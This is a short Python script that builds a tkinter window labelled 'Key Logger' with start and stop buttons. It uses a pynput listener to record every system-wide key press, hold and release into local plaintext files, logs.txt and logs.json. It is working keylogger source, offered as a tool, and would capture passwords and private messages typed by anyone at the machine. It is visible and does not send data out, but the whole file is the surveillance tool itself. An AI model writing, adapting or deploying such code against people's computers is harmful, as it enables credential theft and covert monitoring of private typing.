from tkinter import *
import tkinter as tk
from pynput import keyboard
import json     
keylogger=None

key_list = [] 
x = False
key_strokes=""

def update_txt_file(key):
    with open('logs.txt','w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json','+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append(
            {'pressed' : f'{key}'}
        )
        x = True
    if x == True:
        key_list.append(
            {'Held': f'{key}'}
        )
    update_json_file(key_list)

def on_release(key):
    global x, key_list,key_strokes
    key_list.append(
        {'Released': f'{key}'}
    )
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes=key_strokes+str(key)
    update_txt_file(str(key_strokes))
def startkeylogger():
   global keylogger    
   keylogger= keyboard.Listener(on_press=on_press,on_release=on_release)
   keylogger.start()
def stopkeylogger():
    global keylogger
    keylogger.stop()
    keylogger=None
#GUI
root = tk.Tk()
root.geometry("300x200") 
root.minsize(300,200)
root.title("cyber tool")
f1 = Frame(root,borderwidth=8,bg="blue",relief=SUNKEN)
f1.pack(side=TOP,fill="x")
l=Label(f1,text="Key Logger",font= "bold 16")
l.pack()
b1=Button(text="start",font=30,command=startkeylogger)
b2=Button(text="stop",font=30,command=stopkeylogger)
b1.pack(pady=20)
b2.pack(pady=20)
root.mainloop()